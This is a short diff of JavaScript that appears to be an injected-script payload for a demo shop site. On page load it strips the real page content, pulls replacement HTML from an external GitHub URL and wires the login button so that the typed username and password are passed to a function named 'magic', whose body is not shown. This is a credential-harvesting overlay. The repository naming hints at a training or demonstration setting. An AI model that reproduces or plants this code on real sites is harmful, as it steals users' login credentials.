@@ -15,15 +15,15 @@ function magic(username, password) {
 $(window).on('load', function() {
     // Remove all unwanted content
     $(".row").remove();
-    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html");
+    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xxs_ph.html", hook);
 
     console.log("done");
 });
 
-$(document).ready(function() {
+var hook = function() {
     console.log("ready");
     $('#doLogin_0').click(function() {
         console.log("clicked");
         magic($('#doLogin_username').val(), $('#doLogin_password').val());
     });
-});
+}
